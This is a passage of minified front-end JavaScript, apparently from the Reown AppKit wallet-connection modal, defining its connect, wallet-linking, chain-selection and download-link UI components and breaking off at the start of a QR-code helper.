ableCheck(this.noAdapters,this.remoteFeatures)}),de.subscribeKey("enableWallets",e=>this.enableWallets=e),Y.subscribeKey("noAdapters",e=>this.setEmailAndSocialEnableCheck(e,this.remoteFeatures)),Qm.subscribeKey("isLegalCheckboxChecked",e=>this.checked=e))}disconnectedCallback(){this.unsubscribe.forEach(n=>n()),this.resizeObserver?.disconnect(),this.shadowRoot?.querySelector(".connect")?.removeEventListener("scroll",this.handleConnectListScroll.bind(this))}firstUpdated(){const e=this.shadowRoot?.querySelector(".connect");e&&(requestAnimationFrame(this.handleConnectListScroll.bind(this)),e?.addEventListener("scroll",this.handleConnectListScroll.bind(this)),this.resizeObserver=new ResizeObserver(()=>{this.handleConnectListScroll()}),this.resizeObserver?.observe(e),this.handleConnectListScroll())}render(){const{termsConditionsUrl:e,privacyPolicyUrl:n}=de.state,r=de.state.features?.legalCheckbox,o=!!(e||n)&&!!r&&this.walletGuide==="get-started"&&!this.checked,a={connect:!0,disabled:o},c=de.state.enableWalletGuide,l=this.enableWallets,f=this.isSocialEnabled||this.authConnector,h=o?-1:void 0;return X`
      <wui-flex flexDirection="column">
        ${this.legalCheckboxTemplate()}
        <wui-flex
          data-testid="w3m-connect-scroll-view"
          flexDirection="column"
          .padding=${["0","0","4","0"]}
          class=${JB(a)}
        >
          <wui-flex
            class="connect-methods"
            flexDirection="column"
            gap="2"
            .padding=${f&&l&&c&&this.walletGuide==="get-started"?["0","3","0","3"]:["0","3","3","3"]}
          >
            ${this.renderConnectMethod(h)}
          </wui-flex>
        </wui-flex>
        ${this.reownBrandingTemplate()}
      </wui-flex>
    `}reownBrandingTemplate(){return s1.hasFooter()||!this.remoteFeatures?.reownBranding?null:X`<wui-ux-by-reown></wui-ux-by-reown>`}setEmailAndSocialEnableCheck(e,n){this.isEmailEnabled=n?.email&&!e,this.isSocialEnabled=n?.socials&&n.socials.length>0&&!e,this.remoteFeatures=n,this.noAdapters=e}checkIfAuthEnabled(e){const n=e.filter(i=>i.type===sn.CONNECTOR_TYPE_AUTH).map(i=>i.chain);return ge.AUTH_CONNECTOR_SUPPORTED_CHAINS.some(i=>n.includes(i))}renderConnectMethod(e){const n=Uc.getConnectOrderMethod(this.features,this.connectors);return X`${n.map((r,i)=>{switch(r){case"email":return X`${this.emailTemplate(e)} ${this.separatorTemplate(i,"email")}`;case"social":return X`${this.socialListTemplate(e)}
          ${this.separatorTemplate(i,"social")}`;case"wallet":return X`${this.walletListTemplate(e)}
          ${this.separatorTemplate(i,"wallet")}`;default:return null}})}`}checkMethodEnabled(e){switch(e){case"wallet":return this.enableWallets;case"social":return this.isSocialEnabled&&this.isAuthEnabled;case"email":return this.isEmailEnabled&&this.isAuthEnabled;default:return null}}checkIsThereNextMethod(e){const r=Uc.getConnectOrderMethod(this.features,this.connectors)[e+1];return r?this.checkMethodEnabled(r)?r:this.checkIsThereNextMethod(e+1):void 0}separatorTemplate(e,n){const r=this.checkIsThereNextMethod(e),i=this.walletGuide==="explore";switch(n){case"wallet":return this.enableWallets&&r&&!i?X`<wui-separator data-testid="wui-separator" text="or"></wui-separator>`:null;case"email":{const s=r==="social";return this.isAuthEnabled&&this.isEmailEnabled&&!s&&r?X`<wui-separator
              data-testid="w3m-email-login-or-separator"
              text="or"
            ></wui-separator>`:null}case"social":{const s=r==="email";return this.isAuthEnabled&&this.isSocialEnabled&&!s&&r?X`<wui-separator data-testid="wui-separator" text="or"></wui-separator>`:null}default:return null}}emailTemplate(e){return!this.isEmailEnabled||!this.isAuthEnabled?null:X`<w3m-email-login-widget tabIdx=${et(e)}></w3m-email-login-widget>`}socialListTemplate(e){return!this.isSocialEnabled||!this.isAuthEnabled?null:X`<w3m-social-login-widget
      walletGuide=${this.walletGuide}
      tabIdx=${et(e)}
    ></w3m-social-login-widget>`}walletListTemplate(e){const n=this.enableWallets,r=this.features?.emailShowWallets===!1,i=this.features?.collapseWallets,s=r||i;return!n||(xe.isTelegram()&&(xe.isSafari()||xe.isIos())&&ke.connectWalletConnect().catch(a=>({})),this.walletGuide==="explore")?null:this.isAuthEnabled&&(this.isEmailEnabled||this.isSocialEnabled)&&s?X`<wui-list-button
        data-testid="w3m-collapse-wallets-button"
        tabIdx=${et(e)}
        @click=${this.onContinueWalletClick.bind(this)}
        text="Continue with a wallet"
      ></wui-list-button>`:X`<w3m-wallet-login-list tabIdx=${et(e)}></w3m-wallet-login-list>`}legalCheckboxTemplate(){return this.walletGuide==="explore"?null:X`<w3m-legal-checkbox data-testid="w3m-legal-checkbox"></w3m-legal-checkbox>`}handleConnectListScroll(){const e=this.shadowRoot?.querySelector(".connect");if(!e)return;e.scrollHeight>B7e?(e.style.setProperty("--connect-mask-image",`linear-gradient(
          to bottom,
          rgba(0, 0, 0, calc(1 - var(--connect-scroll--top-opacity))) 0px,
          rgba(200, 200, 200, calc(1 - var(--connect-scroll--top-opacity))) 1px,
          black 100px,
          black calc(100% - 100px),
          rgba(155, 155, 155, calc(1 - var(--connect-scroll--bottom-opacity))) calc(100% - 1px),
          rgba(0, 0, 0, calc(1 - var(--connect-scroll--bottom-opacity))) 100%
        )`),e.style.setProperty("--connect-scroll--top-opacity",Ux.interpolate([0,50],[0,1],e.scrollTop).toString()),e.style.setProperty("--connect-scroll--bottom-opacity",Ux.interpolate([0,50],[0,1],e.scrollHeight-e.scrollTop-e.offsetHeight).toString())):(e.style.setProperty("--connect-mask-image","none"),e.style.setProperty("--connect-scroll--top-opacity","0"),e.style.setProperty("--connect-scroll--bottom-opacity","0"))}onContinueWalletClick(){we.push("ConnectWallets")}};_o.styles=D7e;Qc([Ee()],_o.prototype,"connectors",void 0);Qc([Ee()],_o.prototype,"authConnector",void 0);Qc([Ee()],_o.prototype,"features",void 0);Qc([Ee()],_o.prototype,"remoteFeatures",void 0);Qc([Ee()],_o.prototype,"enableWallets",void 0);Qc([Ee()],_o.prototype,"noAdapters",void 0);Qc([ie()],_o.prototype,"walletGuide",void 0);Qc([Ee()],_o.prototype,"checked",void 0);Qc([Ee()],_o.prototype,"isEmailEnabled",void 0);Qc([Ee()],_o.prototype,"isSocialEnabled",void 0);Qc([Ee()],_o.prototype,"isAuthEnabled",void 0);_o=Qc([Ue("w3m-connect-view")],_o);const j7e=ot`
  :host {
    display: block;
    width: 100px;
    height: 100px;
  }

  svg {
    width: 100px;
    height: 100px;
  }

  rect {
    fill: none;
    stroke: ${t=>t.colors.accent100};
    stroke-width: 3px;
    stroke-linecap: round;
    animation: dash 1s linear infinite;
  }

  @keyframes dash {
    to {
      stroke-dashoffset: 0px;
    }
  }
`;var Kae=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let iI=class extends $e{constructor(){super(...arguments),this.radius=36}render(){return this.svgLoaderTemplate()}svgLoaderTemplate(){const e=this.radius>50?50:this.radius,r=36-e,i=116+r,s=245+r,o=360+r*1.75;return X`
      <svg viewBox="0 0 110 110" width="110" height="110">
        <rect
          x="2"
          y="2"
          width="106"
          height="106"
          rx=${e}
          stroke-dasharray="${i} ${s}"
          stroke-dashoffset=${o}
        />
      </svg>
    `}};iI.styles=[Dt,j7e];Kae([ie({type:Number})],iI.prototype,"radius",void 0);iI=Kae([Ue("wui-loading-thumbnail")],iI);const M7e=ot`
  wui-flex {
    width: 100%;
    height: 52px;
    box-sizing: border-box;
    background-color: ${({tokens:t})=>t.theme.foregroundPrimary};
    border-radius: ${({borderRadius:t})=>t[5]};
    padding-left: ${({spacing:t})=>t[3]};
    padding-right: ${({spacing:t})=>t[3]};
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: ${({spacing:t})=>t[6]};
  }

  wui-text {
    color: ${({tokens:t})=>t.theme.textSecondary};
  }

  wui-icon {
    width: 12px;
    height: 12px;
  }
`;var y8=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let B1=class extends $e{constructor(){super(...arguments),this.disabled=!1,this.label="",this.buttonLabel=""}render(){return X`
      <wui-flex justifyContent="space-between" alignItems="center">
        <wui-text variant="lg-regular" color="inherit">${this.label}</wui-text>
        <wui-button variant="accent-secondary" size="sm">
          ${this.buttonLabel}
          <wui-icon name="chevronRight" color="inherit" size="inherit" slot="iconRight"></wui-icon>
        </wui-button>
      </wui-flex>
    `}};B1.styles=[Dt,nr,M7e];y8([ie({type:Boolean})],B1.prototype,"disabled",void 0);y8([ie()],B1.prototype,"label",void 0);y8([ie()],B1.prototype,"buttonLabel",void 0);B1=y8([Ue("wui-cta-button")],B1);const U7e=ot`
  :host {
    display: block;
    padding: 0 ${({spacing:t})=>t[5]} ${({spacing:t})=>t[5]};
  }
`;var Zae=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let sI=class extends $e{constructor(){super(...arguments),this.wallet=void 0}render(){if(!this.wallet)return this.style.display="none",null;const{name:e,app_store:n,play_store:r,chrome_store:i,homepage:s}=this.wallet,o=xe.isMobile(),a=xe.isIos(),c=xe.isAndroid(),l=[n,r,s,i].filter(Boolean).length>1,f=Cr.getTruncateString({string:e,charsStart:12,charsEnd:0,truncate:"end"});return l&&!o?X`
        <wui-cta-button
          label=${`Don't have ${f}?`}
          buttonLabel="Get"
          @click=${()=>we.push("Downloads",{wallet:this.wallet})}
        ></wui-cta-button>
      `:!l&&s?X`
        <wui-cta-button
          label=${`Don't have ${f}?`}
          buttonLabel="Get"
          @click=${this.onHomePage.bind(this)}
        ></wui-cta-button>
      `:n&&a?X`
        <wui-cta-button
          label=${`Don't have ${f}?`}
          buttonLabel="Get"
          @click=${this.onAppStore.bind(this)}
        ></wui-cta-button>
      `:r&&c?X`
        <wui-cta-button
          label=${`Don't have ${f}?`}
          buttonLabel="Get"
          @click=${this.onPlayStore.bind(this)}
        ></wui-cta-button>
      `:(this.style.display="none",null)}onAppStore(){this.wallet?.app_store&&xe.openHref(this.wallet.app_store,"_blank")}onPlayStore(){this.wallet?.play_store&&xe.openHref(this.wallet.play_store,"_blank")}onHomePage(){this.wallet?.homepage&&xe.openHref(this.wallet.homepage,"_blank")}};sI.styles=[U7e];Zae([ie({type:Object})],sI.prototype,"wallet",void 0);sI=Zae([Ue("w3m-mobile-download-links")],sI);const L7e=ot`
  @keyframes shake {
    0% {
      transform: translateX(0);
    }
    25% {
      transform: translateX(3px);
    }
    50% {
      transform: translateX(-3px);
    }
    75% {
      transform: translateX(3px);
    }
    100% {
      transform: translateX(0);
    }
  }

  wui-flex:first-child:not(:only-child) {
    position: relative;
  }

  wui-wallet-image {
    width: 56px;
    height: 56px;
  }

  wui-loading-thumbnail {
    position: absolute;
  }

  wui-icon-box {
    position: absolute;
    right: calc(${({spacing:t})=>t[1]} * -1);
    bottom: calc(${({spacing:t})=>t[1]} * -1);
    opacity: 0;
    transform: scale(0.5);
    transition-property: opacity, transform;
    transition-duration: ${({durations:t})=>t.lg};
    transition-timing-function: ${({easings:t})=>t["ease-out-power-2"]};
    will-change: opacity, transform;
  }

  wui-text[align='center'] {
    width: 100%;
    padding: 0px ${({spacing:t})=>t[4]};
  }

  [data-error='true'] wui-icon-box {
    opacity: 1;
    transform: scale(1);
  }

  [data-error='true'] > wui-flex:first-child {
    animation: shake 250ms ${({easings:t})=>t["ease-out-power-2"]} both;
  }

  [data-retry='false'] wui-link {
    display: none;
  }

  [data-retry='true'] wui-link {
    display: block;
    opacity: 1;
  }

  w3m-mobile-download-links {
    padding: 0px;
    width: 100%;
  }
`;var Vu=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};class ss extends $e{constructor(){super(),this.wallet=we.state.data?.wallet,this.connector=we.state.data?.connector,this.timeout=void 0,this.secondaryBtnIcon="refresh",this.onConnect=void 0,this.onRender=void 0,this.onAutoConnect=void 0,this.isWalletConnect=!0,this.unsubscribe=[],this.imageSrc=er.getConnectorImage(this.connector)??er.getWalletImage(this.wallet),this.name=this.wallet?.name??this.connector?.name??"Wallet",this.isRetrying=!1,this.uri=ke.state.wcUri,this.error=ke.state.wcError,this.ready=!1,this.showRetry=!1,this.label=void 0,this.secondaryBtnLabel="Try again",this.secondaryLabel="Accept connection request in the wallet",this.isLoading=!1,this.isMobile=!1,this.onRetry=void 0,this.unsubscribe.push(ke.subscribeKey("wcUri",e=>{this.uri=e,this.isRetrying&&this.onRetry&&(this.isRetrying=!1,this.onConnect?.())}),ke.subscribeKey("wcError",e=>this.error=e)),(xe.isTelegram()||xe.isSafari())&&xe.isIos()&&ke.state.wcUri&&this.onConnect?.()}firstUpdated(){this.onAutoConnect?.(),this.showRetry=!this.onAutoConnect}disconnectedCallback(){this.unsubscribe.forEach(e=>e()),ke.setWcError(!1),clearTimeout(this.timeout)}render(){this.onRender?.(),this.onShowRetry();const e=this.error?"Connection can be declined if a previous request is still active":this.secondaryLabel;let n="";return this.label?n=this.label:(n=`Continue in ${this.name}`,this.error&&(n="Connection declined")),X`
      <wui-flex
        data-error=${et(this.error)}
        data-retry=${this.showRetry}
        flexDirection="column"
        alignItems="center"
        .padding=${["10","5","5","5"]}
        gap="6"
      >
        <wui-flex gap="2" justifyContent="center" alignItems="center">
          <wui-wallet-image size="lg" imageSrc=${et(this.imageSrc)}></wui-wallet-image>

          ${this.error?null:this.loaderTemplate()}

          <wui-icon-box
            color="error"
            icon="close"
            size="sm"
            border
            borderColor="wui-color-bg-125"
          ></wui-icon-box>
        </wui-flex>

        <wui-flex flexDirection="column" alignItems="center" gap="6"> <wui-flex
          flexDirection="column"
          alignItems="center"
          gap="2"
          .padding=${["2","0","0","0"]}
        >
          <wui-text align="center" variant="lg-medium" color=${this.error?"error":"primary"}>
            ${n}
          </wui-text>
          <wui-text align="center" variant="lg-regular" color="secondary">${e}</wui-text>
        </wui-flex>

        ${this.secondaryBtnLabel?X`
                <wui-button
                  variant="neutral-secondary"
                  size="md"
                  ?disabled=${this.isRetrying||this.isLoading}
                  @click=${this.onTryAgain.bind(this)}
                  data-testid="w3m-connecting-widget-secondary-button"
                >
                  <wui-icon
                    color="inherit"
                    slot="iconLeft"
                    name=${this.secondaryBtnIcon}
                  ></wui-icon>
                  ${this.secondaryBtnLabel}
                </wui-button>
              `:null}
      </wui-flex>

      ${this.isWalletConnect?X`
              <wui-flex .padding=${["0","5","5","5"]} justifyContent="center">
                <wui-link
                  @click=${this.onCopyUri}
                  variant="secondary"
                  icon="copy"
                  data-testid="wui-link-copy"
                >
                  Copy link
                </wui-link>
              </wui-flex>
            `:null}

      <w3m-mobile-download-links .wallet=${this.wallet}></w3m-mobile-download-links></wui-flex>
      </wui-flex>
    `}onShowRetry(){this.error&&!this.showRetry&&(this.showRetry=!0,this.shadowRoot?.querySelector("wui-button")?.animate([{opacity:0},{opacity:1}],{fill:"forwards",easing:"ease"}))}onTryAgain(){ke.setWcError(!1),this.onRetry?(this.isRetrying=!0,this.onRetry?.()):this.onConnect?.()}loaderTemplate(){const e=Ji.state.themeVariables["--w3m-border-radius-master"],n=e?parseInt(e.replace("px",""),10):4;return X`<wui-loading-thumbnail radius=${n*9}></wui-loading-thumbnail>`}onCopyUri(){try{this.uri&&(xe.copyToClopboard(this.uri),on.showSuccess("Link copied"))}catch{on.showError("Failed to copy")}}}ss.styles=L7e;Vu([Ee()],ss.prototype,"isRetrying",void 0);Vu([Ee()],ss.prototype,"uri",void 0);Vu([Ee()],ss.prototype,"error",void 0);Vu([Ee()],ss.prototype,"ready",void 0);Vu([Ee()],ss.prototype,"showRetry",void 0);Vu([Ee()],ss.prototype,"label",void 0);Vu([Ee()],ss.prototype,"secondaryBtnLabel",void 0);Vu([Ee()],ss.prototype,"secondaryLabel",void 0);Vu([Ee()],ss.prototype,"isLoading",void 0);Vu([ie({type:Boolean})],ss.prototype,"isMobile",void 0);Vu([ie()],ss.prototype,"onRetry",void 0);var F7e=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let Z7=class extends ss{constructor(){if(super(),this.externalViewUnsubscribe=[],this.connectionsByNamespace=ke.getConnections(this.connector?.chain),this.hasMultipleConnections=this.connectionsByNamespace.length>0,this.remoteFeatures=de.state.remoteFeatures,this.currentActiveConnectorId=Ce.state.activeConnectorIds[this.connector?.chain],!this.connector)throw new Error("w3m-connecting-view: No connector provided");const e=this.connector?.chain;this.isAlreadyConnected(this.connector)&&(this.secondaryBtnLabel=void 0,this.label=`This account is already linked, change your account in ${this.connector.name}`,this.secondaryLabel=`To link a new account, open ${this.connector.name} and switch to the account you want to link`),tt.sendEvent({type:"track",event:"SELECT_WALLET",properties:{name:this.connector.name??"Unknown",platform:"browser",displayIndex:this.wallet?.display_index,walletRank:this.wallet?.order,view:we.state.view}}),this.onConnect=this.onConnectProxy.bind(this),this.onAutoConnect=this.onConnectProxy.bind(this),this.isWalletConnect=!1,this.externalViewUnsubscribe.push(Ce.subscribeKey("activeConnectorIds",n=>{const r=n[e],i=this.remoteFeatures?.multiWallet,{redirectView:s}=we.state.data??{};r!==this.currentActiveConnectorId&&(this.hasMultipleConnections&&i?(we.replace("ProfileWallets"),on.showSuccess("New Wallet Added")):s?we.replace(s):kt.close())}),ke.subscribeKey("connections",this.onConnectionsChange.bind(this)))}disconnectedCallback(){this.externalViewUnsubscribe.forEach(e=>e())}async onConnectProxy(){try{if(this.error=!1,this.connector){if(this.isAlreadyConnected(this.connector))return;(this.connector.id!==ge.CONNECTOR_ID.COINBASE_SDK||!this.error)&&await ke.connectExternal(this.connector,this.connector.chain)}}catch(e){e instanceof Zl&&e.originalName===Ka.PROVIDER_RPC_ERROR_NAME.USER_REJECTED_REQUEST?tt.sendEvent({type:"track",event:"USER_REJECTED",properties:{message:e.message}}):tt.sendEvent({type:"track",event:"CONNECT_ERROR",properties:{message:e?.message??"Unknown"}}),this.error=!0}}onConnectionsChange(e){if(this.connector?.chain&&e.get(this.connector.chain)&&this.isAlreadyConnected(this.connector)){const n=e.get(this.connector.chain)??[],r=this.remoteFeatures?.multiWallet;if(n.length===0)we.replace("Connect");else{const i=Dc.getConnectionsByConnectorId(this.connectionsByNamespace,this.connector.id).flatMap(o=>o.accounts),s=Dc.getConnectionsByConnectorId(n,this.connector.id).flatMap(o=>o.accounts);s.length===0?this.hasMultipleConnections&&r?(we.replace("ProfileWallets"),on.showSuccess("Wallet deleted")):kt.close():!i.every(a=>s.some(c=>Gr.isLowerCaseMatch(a.address,c.address)))&&r&&we.replace("ProfileWallets")}}}isAlreadyConnected(e){return!!e&&this.connectionsByNamespace.some(n=>Gr.isLowerCaseMatch(n.connectorId,e.id))}};Z7=F7e([Ue("w3m-connecting-external-view")],Z7);const $7e=mr`
  wui-flex,
  wui-list-wallet {
    width: 100%;
  }
`;var Yae=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let w_=class extends $e{constructor(){super(),this.unsubscribe=[],this.activeConnector=Ce.state.activeConnector,this.unsubscribe.push(Ce.subscribeKey("activeConnector",e=>this.activeConnector=e))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){return X`
      <wui-flex
        flexDirection="column"
        alignItems="center"
        .padding=${["3","5","5","5"]}
        gap="5"
      >
        <wui-flex justifyContent="center" alignItems="center">
          <wui-wallet-image
            size="lg"
            imageSrc=${et(er.getConnectorImage(this.activeConnector))}
          ></wui-wallet-image>
        </wui-flex>
        <wui-flex
          flexDirection="column"
          alignItems="center"
          gap="2"
          .padding=${["0","3","0","3"]}
        >
          <wui-text variant="lg-medium" color="primary">
            Select Chain for ${this.activeConnector?.name}
          </wui-text>
          <wui-text align="center" variant="lg-regular" color="secondary"
            >Select which chain to connect to your multi chain wallet</wui-text
          >
        </wui-flex>
        <wui-flex
          flexGrow="1"
          flexDirection="column"
          alignItems="center"
          gap="2"
          .padding=${["2","0","2","0"]}
        >
          ${this.networksTemplate()}
        </wui-flex>
      </wui-flex>
    `}networksTemplate(){return this.activeConnector?.connectors?.map((e,n)=>e.name?X`
            <w3m-list-wallet
              displayIndex=${n}
              imageSrc=${et(er.getChainImage(e.chain))}
              name=${ge.CHAIN_NAME_MAP[e.chain]}
              @click=${()=>this.onConnector(e)}
              size="sm"
              data-testid="wui-list-chain-${e.chain}"
              rdnsId=${e.explorerWallet?.rdns}
            ></w3m-list-wallet>
          `:null)}onConnector(e){const n=this.activeConnector?.connectors?.find(i=>i.chain===e.chain),r=we.state.data?.redirectView;if(!n){on.showError("Failed to find connector");return}n.id==="walletConnect"?xe.isMobile()?we.push("AllWallets"):we.push("ConnectingWalletConnect",{redirectView:r}):we.push("ConnectingExternal",{connector:n,redirectView:r,wallet:this.activeConnector?.explorerWallet})}};w_.styles=$7e;Yae([Ee()],w_.prototype,"activeConnector",void 0);w_=Yae([Ue("w3m-connecting-multi-chain-view")],w_);var sj=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let oI=class extends $e{constructor(){super(...arguments),this.platformTabs=[],this.unsubscribe=[],this.platforms=[],this.onSelectPlatfrom=void 0}disconnectCallback(){this.unsubscribe.forEach(e=>e())}render(){const e=this.generateTabs();return X`
      <wui-flex justifyContent="center" .padding=${["0","0","4","0"]}>
        <wui-tabs .tabs=${e} .onTabChange=${this.onTabChange.bind(this)}></wui-tabs>
      </wui-flex>
    `}generateTabs(){const e=this.platforms.map(n=>n==="browser"?{label:"Browser",icon:"extension",platform:"browser"}:n==="mobile"?{label:"Mobile",icon:"mobile",platform:"mobile"}:n==="qrcode"?{label:"Mobile",icon:"mobile",platform:"qrcode"}:n==="web"?{label:"Webapp",icon:"browser",platform:"web"}:n==="desktop"?{label:"Desktop",icon:"desktop",platform:"desktop"}:{label:"Browser",icon:"extension",platform:"unsupported"});return this.platformTabs=e.map(({platform:n})=>n),e}onTabChange(e){const n=this.platformTabs[e];n&&this.onSelectPlatfrom?.(n)}};sj([ie({type:Array})],oI.prototype,"platforms",void 0);sj([ie()],oI.prototype,"onSelectPlatfrom",void 0);oI=sj([Ue("w3m-connecting-header")],oI);var H7e=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let mW=class extends ss{constructor(){if(super(),!this.wallet)throw new Error("w3m-connecting-wc-browser: No wallet provided");this.onConnect=this.onConnectProxy.bind(this),this.onAutoConnect=this.onConnectProxy.bind(this),tt.sendEvent({type:"track",event:"SELECT_WALLET",properties:{name:this.wallet.name,platform:"browser",displayIndex:this.wallet?.display_index,walletRank:this.wallet.order,view:we.state.view}})}async onConnectProxy(){try{this.error=!1;const{connectors:e}=Ce.state,n=e.find(r=>r.type==="ANNOUNCED"&&r.info?.rdns===this.wallet?.rdns||r.type==="INJECTED"||r.name===this.wallet?.name);if(n)await ke.connectExternal(n,n.chain);else throw new Error("w3m-connecting-wc-browser: No connector found");kt.close()}catch(e){e instanceof Zl&&e.originalName===Ka.PROVIDER_RPC_ERROR_NAME.USER_REJECTED_REQUEST?tt.sendEvent({type:"track",event:"USER_REJECTED",properties:{message:e.message}}):tt.sendEvent({type:"track",event:"CONNECT_ERROR",properties:{message:e?.message??"Unknown"}}),this.error=!0}}};mW=H7e([Ue("w3m-connecting-wc-browser")],mW);var z7e=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let gW=class extends ss{constructor(){if(super(),!this.wallet)throw new Error("w3m-connecting-wc-desktop: No wallet provided");this.onConnect=this.onConnectProxy.bind(this),this.onRender=this.onRenderProxy.bind(this),tt.sendEvent({type:"track",event:"SELECT_WALLET",properties:{name:this.wallet.name,platform:"desktop",displayIndex:this.wallet?.display_index,walletRank:this.wallet.order,view:we.state.view}})}onRenderProxy(){!this.ready&&this.uri&&(this.ready=!0,this.onConnect?.())}onConnectProxy(){if(this.wallet?.desktop_link&&this.uri)try{this.error=!1;const{desktop_link:e,name:n}=this.wallet,{redirect:r,href:i}=xe.formatNativeUrl(e,this.uri);ke.setWcLinking({name:n,href:i}),ke.setRecentWallet(this.wallet),xe.openHref(r,"_blank")}catch{this.error=!0}}};gW=z7e([Ue("w3m-connecting-wc-desktop")],gW);var fw=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let xg=class extends ss{constructor(){if(super(),this.btnLabelTimeout=void 0,this.redirectDeeplink=void 0,this.redirectUniversalLink=void 0,this.target=void 0,this.preferUniversalLinks=de.state.experimental_preferUniversalLinks,this.isLoading=!0,this.onConnect=()=>{if(this.wallet?.mobile_link&&this.uri)try{this.error=!1;const{mobile_link:e,link_mode:n,name:r}=this.wallet,{redirect:i,redirectUniversalLink:s,href:o}=xe.formatNativeUrl(e,this.uri,n);this.redirectDeeplink=i,this.redirectUniversalLink=s,this.target=xe.isIframe()?"_top":"_self",ke.setWcLinking({name:r,href:o}),ke.setRecentWallet(this.wallet),this.preferUniversalLinks&&this.redirectUniversalLink?xe.openHref(this.redirectUniversalLink,this.target):xe.openHref(this.redirectDeeplink,this.target)}catch(e){tt.sendEvent({type:"track",event:"CONNECT_PROXY_ERROR",properties:{message:e instanceof Error?e.message:"Error parsing the deeplink",uri:this.uri,mobile_link:this.wallet.mobile_link,name:this.wallet.name}}),this.error=!0}},!this.wallet)throw new Error("w3m-connecting-wc-mobile: No wallet provided");this.secondaryBtnLabel="Open",this.secondaryLabel=jt.CONNECT_LABELS.MOBILE,this.secondaryBtnIcon="externalLink",this.onHandleURI(),this.unsubscribe.push(ke.subscribeKey("wcUri",()=>{this.onHandleURI()})),tt.sendEvent({type:"track",event:"SELECT_WALLET",properties:{name:this.wallet.name,platform:"mobile",displayIndex:this.wallet?.display_index,walletRank:this.wallet.order,view:we.state.view}})}disconnectedCallback(){super.disconnectedCallback(),clearTimeout(this.btnLabelTimeout)}onHandleURI(){this.isLoading=!this.uri,!this.ready&&this.uri&&(this.ready=!0,this.onConnect?.())}onTryAgain(){ke.setWcError(!1),this.onConnect?.()}};fw([Ee()],xg.prototype,"redirectDeeplink",void 0);fw([Ee()],xg.prototype,"redirectUniversalLink",void 0);fw([Ee()],xg.prototype,"target",void 0);fw([Ee()],xg.prototype,"preferUniversalLinks",void 0);fw([Ee()],xg.prototype,"isLoading",void 0);xg=fw([Ue("w3m-connecting-wc-mobile")],xg);var lb={},G9,yW;function q7e(){return yW||(yW=1,G9=function(){return typeof Promise=="function"&&Promise.prototype&&Promise.prototype.then}),G9}var K9={},Kh={},bW;function Qg(){if(bW)return Kh;bW=1;let t;const e=[0,26,44,70,100,134,172,196,242,292,346,404,466,532,581,655,733,815,901,991,1085,1156,1258,1364,1474,1588,1706,1828,1921,2051,2185,2323,2465,2611,2761,2876,3034,3196,3362,3532,3706];return Kh.getSymbolSize=function(r){if(!r)throw new Error('"version" cannot be null or undefined');if(r<1||r>40)throw new Error('"version" should be in range from 1 to 40');return 